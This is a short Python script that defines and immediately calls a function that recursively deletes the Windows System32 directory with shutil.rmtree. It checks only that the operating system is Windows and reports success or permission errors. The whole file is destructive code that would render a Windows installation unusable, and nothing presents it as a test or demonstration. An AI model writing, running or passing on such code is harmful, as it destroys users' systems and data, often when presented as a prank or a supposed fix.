import os
import shutil
def delete_system32():
   if os.name != 'nt':
       raise OSError("This function is only supported on Windows operating system.")
   system32_path = os.path.join(os.environ['SystemRoot'], 'System32')
   if not os.path.exists(system32_path):
       raise FileNotFoundError("System32 directory does not exist.")
   try:
       shutil.rmtree(system32_path)
       print("System32 directory removed successfully.")
   except PermissionError as e:
       print(f"Error while removing System32 directory: {e}")
   except OSError as e:
       print(f"Error: {e}")
delete_system32()